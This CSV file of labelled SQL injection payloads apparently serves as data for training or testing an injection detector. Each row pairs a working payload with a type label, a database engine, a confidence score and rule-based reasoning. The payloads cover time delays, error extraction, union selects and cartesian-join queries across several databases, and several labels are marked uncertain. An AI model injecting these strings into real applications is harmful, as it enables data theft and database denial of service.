id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
19022,"1' in boolean mode ) and elt ( 1210 = 1210,sleep ( 5 ) ) #",boolean_blind,mysql,0.95,"Token 'elt (' matched in payload '1' in boolean mode ) and elt ( 1210 = 1210,sleep ( 5 ) ) #' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'elt' → mysql; secondary signal 'sleep (' (time_blind P5) overridden by priority",2
19023,"1' ) ) as dtwh where 9633 = 9633 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,0.80,"Token 'where 9633 = 9633' matched in payload '1' ) ) as dtwh where 9633 = 9633 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",2
19024,"1"" ) as jaxh where 6318 = 6318 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",boolean_blind,mysql,0.95,"Token 'elt (' matched in payload '1"" ) as jaxh where 6318 = 6318 and extractvalue ( 7982,concat ( 0x5c,0x7171706a7' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'extractvalue' → mysql; secondary signal 'extractvalue' (error_based P4) overridden by priority",2
19025,end and ( ( '%' = ',boolean_blind,generic,0.50,"UNCERTAIN: payload 'end and ( ( '%' = '' has SQL syntax but no priority-tagged signal (no UNION/SLEEP/XMLTYPE/ELT/RLIKE/WAITFOR matched). a_type=boolean_blind, c_type=benign.",2
19026,"1"" where 9618 = 9618 and ( 3020 = 3020 ) *6703--",boolean_blind,generic,0.80,"Token 'and ( 3020 = 3020 )' matched in payload '1"" where 9618 = 9618 and ( 3020 = 3020 ) *6703--' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",3
19027,-2402 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) -- szgq,boolean_blind,generic,0.80,"Token 'case when ( 3440 = 3440 ) then 1 else' matched in payload '-2402 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) |' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",3
19028,"1' ) ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( 'msjw' like 'msjw",boolean_blind,firebird,0.50,"UNCERTAIN: payload '1' ) ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,r' has SQL syntax but no priority-tagged signal (no UNION/SLEEP/XMLTYPE/ELT/RLIKE/WAITFOR matched). a_type=boolean_blind, c_type=boolean_blind.",3
19029,"1 ) where 5465 = 5465 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.95,"Token 'where 5465 = 5465' matched in payload '1 ) where 5465 = 5465 or 8315 = ( select count ( * ) from sysibm.systables as t1' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'sysibm.systables' → db2; secondary signal 'from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3' (heavy_query P4) overridden by priority",3
19030,"1%' ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( '%' = '",boolean_blind,mysql,0.90,"Token 'elt (' matched in payload '1%' ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( se' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'information_schema' → mysql",2
19031,"1"" ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ""opgb"" like ""opgb",heavy_query,generic,0.80,"Token 'from domain.domains as t1,domain.columns as t2,domain.tables as t3' matched in payload '1"" ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns ' → heavy_query (P4, heavy compute / cartesian join); No exclusive DB signature → generic",1
19032,"-8053"" where 5458 = 5458 or 9323 = 9323#",boolean_blind,generic,0.80,"Token 'or 9323 = 9323' matched in payload '-8053"" where 5458 = 5458 or 9323 = 9323#' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",3
19033,"1' ) where 7640 = 7640 and make_set ( 8978 = 8594,8594 ) --",boolean_blind,generic,0.80,"Token 'where 7640 = 7640' matched in payload '1' ) where 7640 = 7640 and make_set ( 8978 = 8594,8594 ) --' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",3
19034,"1'+ ( select ouhd where 8905 = 8905 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ) +'",boolean_blind,generic,0.80,"Token 'where 8905 = 8905' matched in payload '1'+ ( select ouhd where 8905 = 8905 and 6510 = ( select count ( * ) from sysuser' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",3
19035,select ( case when ( 1272 = 5883 ) then 1272 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,boolean_blind,oracle,0.95,"Token 'case when ( 1272 = 5883 ) then 1272 else' matched in payload 'select ( case when ( 1272 = 5883 ) then 1272 else cast ( 1 as int ) / ( select 0' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'dual' → oracle; secondary signal 'cast ( 1 as int' (error_based P4) overridden by priority",3
19036,"1' ) and make_set ( 4551 = 6487,6487 ) and ( 'jnqa' = 'jnqa",boolean_blind,generic,0.50,"UNCERTAIN: payload '1' ) and make_set ( 4551 = 6487,6487 ) and ( 'jnqa' = 'jnqa' has SQL syntax but no priority-tagged signal (no UNION/SLEEP/XMLTYPE/ELT/RLIKE/WAITFOR matched). a_type=boolean_blind, c_type=benign.",2
19037,"1"" ) where 7723 = 7723 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",boolean_blind,firebird,0.90,"Token 'where 7723 = 7723' matched in payload '1"" ) where 7723 = 7723 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then ' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'rdb$' → firebird",3
19038,"-3445 union all select 5505,5505,5505--",union_based,generic,0.80,"Token 'union all select' matched in payload '-3445 union all select 5505,5505,5505--' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
19039,"1"" ) ) as szxa where 1501 = 1501 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.95,"Token 'where 1501 = 1501' matched in payload '1"" ) ) as szxa where 1501 = 1501 and 8189 = ( select count ( * ) from sysibm.sys' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'sysibm.systables' → db2; secondary signal 'from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3' (heavy_query P4) overridden by priority",3
19040,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( '%' = '",heavy_query,db2,0.90,"Token 'from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3' matched in payload 'select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.sys' → heavy_query (P4, heavy compute / cartesian join); DB signature token 'sysibm.systables' → db2",1
19041,"1"" ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ""gvlc"" like ""gvlc",boolean_blind,generic,0.50,"UNCERTAIN: payload '1"" ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring' has SQL syntax but no priority-tagged signal (no UNION/SLEEP/XMLTYPE/ELT/RLIKE/WAITFOR matched). a_type=boolean_blind, c_type=heavy_query.",2
19042,select ( case when ( 4636 = 1108 ) then 1 else 4636* ( select 4636 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.90,"Token 'case when ( 4636 = 1108 ) then 1 else' matched in payload 'select ( case when ( 4636 = 1108 ) then 1 else 4636* ( select 4636 from master..' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'sysdatabases' → mssql",3
19043,-4494 or 5291 = 4452,boolean_blind,generic,0.80,"Token 'or 5291 = 4452' matched in payload '-4494 or 5291 = 4452' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",3
19044,"1 where 8074 = 8074 and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,mysql,0.95,"Token 'elt (' matched in payload '1 where 8074 = 8074 and elt ( 3114 = 3114,sleep ( 5 ) ) #' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'elt' → mysql; secondary signal 'sleep (' (time_blind P5) overridden by priority",3
19045,"1%"" or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,0.50,"UNCERTAIN: payload '1%"" or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ' has SQL syntax but no priority-tagged signal (no UNION/SLEEP/XMLTYPE/ELT/RLIKE/WAITFOR matched). a_type=boolean_blind, c_type=heavy_query.",2
19046,-7242' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and 'kfff' = 'kfff,boolean_blind,oracle,0.95,"Token 'case when ( 4144 = 4144 ) then 1 else' matched in payload '-7242' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'xmltype' → oracle; secondary signal 'xmltype' (error_based P4) overridden by priority",2
19047,"1 ) ) as xebl where 3105 = 3105 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",boolean_blind,postgresql,0.95,"Token 'where 3105 = 3105' matched in payload '1 ) ) as xebl where 3105 = 3105 or 8421 = ( select count ( * ) from generate_ser' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'generate_series' → postgresql; secondary signal 'generate_series' (heavy_query P4) overridden by priority",1
19048,1' and ( 3020 = 3020 ) *6703,boolean_blind,generic,0.80,"Token 'and ( 3020 = 3020 )' matched in payload '1' and ( 3020 = 3020 ) *6703' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",2
19049,1' ) ) ) and sleep ( 5 ) and ( ( ( 'hwjy' = 'hwjy,time_blind,mysql,0.90,"Token 'sleep (' matched in payload '1' ) ) ) and sleep ( 5 ) and ( ( ( 'hwjy' = 'hwjy' → time_blind (P5, time delay function); DB signature token 'sleep (' → mysql",2
19050,1' ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( 'ineq' like 'ineq,time_blind,postgresql,0.90,"Token 'pg_sleep' matched in payload '1' ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( 'ineq' like 'i' → time_blind (P5, time delay function); DB signature token 'pg_sleep' → postgresql",2
19051,"1 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) -- wvjy",error_based,mysql,0.95,"Token 'extractvalue' matched in payload '1 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,m' → error_based (P4, error-based XML/cast function); DB signature token 'extractvalue' → mysql; secondary signal 'benchmark (' (time_blind P5) overridden by priority",2
19052,"1 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.50,"UNCERTAIN: payload '1 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$colla' has SQL syntax but no priority-tagged signal (no UNION/SLEEP/XMLTYPE/ELT/RLIKE/WAITFOR matched). a_type=boolean_blind, c_type=boolean_blind.",3
19053,"-5190%"" or 8298 = 9306 and ""%"" = """,boolean_blind,generic,0.80,"Token 'or 8298 = 9306' matched in payload '-5190%"" or 8298 = 9306 and ""%"" = ""' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",3
19054,"1%"" ) ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.90,"Token 'from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3' matched in payload '1%"" ) ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.syst' → heavy_query (P4, heavy compute / cartesian join); DB signature token 'sysibm.systables' → db2",1
19055,"1"" ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.90,"Token 'benchmark (' matched in payload '1"" ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #' → time_blind (P5, time delay function); DB signature token 'benchmark' → mysql",2
19056,"1"" ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.90,"Token 'from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3' matched in payload '1"" ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables' → heavy_query (P4, heavy compute / cartesian join); DB signature token 'sysibm.systables' → db2",1
19057,1'|| ( select 'aojt' from dual where 8499 = 8499,boolean_blind,oracle,0.90,"Token 'where 8499 = 8499' matched in payload '1'|| ( select 'aojt' from dual where 8499 = 8499' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'dual' → oracle",3
19058,"1"" rlike sleep ( 5 ) #",time_blind,mysql,0.90,"Token 'sleep (' matched in payload '1"" rlike sleep ( 5 ) #' → time_blind (P5, time delay function); DB signature token 'rlike' → mysql",2
19059,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'nkte' = 'nkte",boolean_blind,firebird,0.50,"UNCERTAIN: payload 'select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rd' has SQL syntax but no priority-tagged signal (no UNION/SLEEP/XMLTYPE/ELT/RLIKE/WAITFOR matched). a_type=boolean_blind, c_type=boolean_blind.",3
19060,"1 ) where 6340 = 6340 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",boolean_blind,mysql,0.95,"Token 'elt (' matched in payload '1 ) where 6340 = 6340 and exp ( ~ ( select * from ( select concat ( 0x7171706a71' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'elt' → mysql; secondary signal 'exp ( ~' (error_based P4) overridden by priority",2
19061,"1%"" ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ""%"" = """,boolean_blind,mysql,0.90,"Token 'elt (' matched in payload '1%"" ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( sel' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'information_schema' → mysql",2
19062,"1%' ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.50,"UNCERTAIN: payload '1%' ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,s' has SQL syntax but no priority-tagged signal (no UNION/SLEEP/XMLTYPE/ELT/RLIKE/WAITFOR matched). a_type=boolean_blind, c_type=boolean_blind.",3
19063,1' ) ) as zqeg where 4729 = 4729 and ( 1098 = 9682 ) *9682--,boolean_blind,generic,0.80,"Token 'and ( 1098 = 9682 )' matched in payload '1' ) ) as zqeg where 4729 = 4729 and ( 1098 = 9682 ) *9682--' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",3
19064,"-7329"" ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( ""borw"" like ""borw",boolean_blind,firebird,0.50,"UNCERTAIN: payload '-7329"" ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 en' has SQL syntax but no priority-tagged signal (no UNION/SLEEP/XMLTYPE/ELT/RLIKE/WAITFOR matched). a_type=boolean_blind, c_type=boolean_blind.",3
19065,"1 where 8114 = 8114 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.80,"Token 'where 8114 = 8114' matched in payload '1 where 8114 = 8114 and 6510 = ( select count ( * ) from sysusers as sys1,sysuse' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",3
19066,1' ) where 8776 = 8776 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,boolean_blind,postgresql,0.95,"Token 'where 8776 = 8776' matched in payload '1' ) where 8776 = 8776 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'pg_sleep' → postgresql; secondary signal 'pg_sleep' (time_blind P5) overridden by priority",2
19067,"-7184 ) as fshx where 3408 = 3408 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",boolean_blind,oracle,0.95,"Token 'case when ( 5023 = 5023 ) then 1 else' matched in payload '-7184 ) as fshx where 3408 = 3408 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 11' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'dual' → oracle; secondary signal 'ctxsys.drithsx' (error_based P4) overridden by priority",1
19068,"1 ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",boolean_blind,firebird,0.50,"UNCERTAIN: payload '1 ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$col' has SQL syntax but no priority-tagged signal (no UNION/SLEEP/XMLTYPE/ELT/RLIKE/WAITFOR matched). a_type=boolean_blind, c_type=boolean_blind.",3
19069,-9212 or 1026 = 7967#,boolean_blind,generic,0.80,"Token 'or 1026 = 7967' matched in payload '-9212 or 1026 = 7967#' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",3
19070,"1"" ) where 6843 = 6843 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --",boolean_blind,postgresql,0.95,"Token 'where 6843 = 6843' matched in payload '1"" ) where 6843 = 6843 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'pg_sleep' → postgresql; secondary signal 'pg_sleep' (time_blind P5) overridden by priority",2
19071,"-5174' ) ) ) or make_set ( 9515 = 7938,7938 ) and ( ( ( 'ygee' = 'ygee",boolean_blind,generic,0.50,"UNCERTAIN: payload '-5174' ) ) ) or make_set ( 9515 = 7938,7938 ) and ( ( ( 'ygee' = 'ygee' has SQL syntax but no priority-tagged signal (no UNION/SLEEP/XMLTYPE/ELT/RLIKE/WAITFOR matched). a_type=boolean_blind, c_type=benign.",2
19072,"1%"" ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""%"" = """,boolean_blind,generic,0.50,"UNCERTAIN: payload '1%"" ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_subst' has SQL syntax but no priority-tagged signal (no UNION/SLEEP/XMLTYPE/ELT/RLIKE/WAITFOR matched). a_type=boolean_blind, c_type=heavy_query.",2
19073,"1"" ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ""lxfm"" = ""lxfm",boolean_blind,generic,0.80,"Token 'case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else' matched in payload '1"" ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( ' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",2
19074,"1' ) ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.50,"UNCERTAIN: payload '1' ) ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,' has SQL syntax but no priority-tagged signal (no UNION/SLEEP/XMLTYPE/ELT/RLIKE/WAITFOR matched). a_type=boolean_blind, c_type=boolean_blind.",3
19075,"1 ) ) as gcvw where 7363 = 7363 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",boolean_blind,mysql,0.95,"Token 'elt (' matched in payload '1 ) ) as gcvw where 7363 = 7363 or row ( 1045,7562 ) > ( select count ( * ) ,con' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'elt' → mysql; secondary signal 'union select' (union_based P7) overridden by priority",2
19076,"1 ) where 7485 = 7485 and make_set ( 8403 = 8403,8899 ) --",boolean_blind,generic,0.80,"Token 'where 7485 = 7485' matched in payload '1 ) where 7485 = 7485 and make_set ( 8403 = 8403,8899 ) --' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",3
19077,"1 ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",boolean_blind,mysql,0.95,"Token 'elt (' matched in payload '1 ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( ' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'elt' → mysql; secondary signal 'exp ( ~' (error_based P4) overridden by priority",2
19078,"1' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'bpbe' like 'bpbe",boolean_blind,generic,0.50,"UNCERTAIN: payload '1' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substrin' has SQL syntax but no priority-tagged signal (no UNION/SLEEP/XMLTYPE/ELT/RLIKE/WAITFOR matched). a_type=boolean_blind, c_type=heavy_query.",2
19079,"1'+ ( select jxgx where 7446 = 7446 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.95,"Token 'where 7446 = 7446' matched in payload '1'+ ( select jxgx where 7446 = 7446 and 8189 = ( select count ( * ) from sysibm.' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'sysibm.systables' → db2; secondary signal 'from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3' (heavy_query P4) overridden by priority",3
19080,select ( case when ( 3626 = 6022 ) then 3626 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,boolean_blind,oracle,0.95,"Token 'case when ( 3626 = 6022 ) then 3626 else' matched in payload 'select ( case when ( 3626 = 6022 ) then 3626 else cast ( 1 as int ) / ( select 0' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'dual' → oracle; secondary signal 'cast ( 1 as int' (error_based P4) overridden by priority",3
19081,"1%"" ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,0.50,"UNCERTAIN: payload '1%"" ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_su' has SQL syntax but no priority-tagged signal (no UNION/SLEEP/XMLTYPE/ELT/RLIKE/WAITFOR matched). a_type=boolean_blind, c_type=heavy_query.",2
19082,"1 ) ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( 4744 = 4744",boolean_blind,firebird,0.50,"UNCERTAIN: payload '1 ) ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rd' has SQL syntax but no priority-tagged signal (no UNION/SLEEP/XMLTYPE/ELT/RLIKE/WAITFOR matched). a_type=boolean_blind, c_type=boolean_blind.",3
19083,1' in boolean mode ) or sleep ( 5 ) #,time_blind,mysql,0.90,"Token 'sleep (' matched in payload '1' in boolean mode ) or sleep ( 5 ) #' → time_blind (P5, time delay function); DB signature token 'sleep (' → mysql",2
19084,"1' ) as lrif where 6525 = 6525 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",boolean_blind,mysql,0.95,"Token 'elt (' matched in payload '1' ) as lrif where 6525 = 6525 or row ( 1045,7562 ) > ( select count ( * ) ,conc' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'elt' → mysql; secondary signal 'union select' (union_based P7) overridden by priority",2
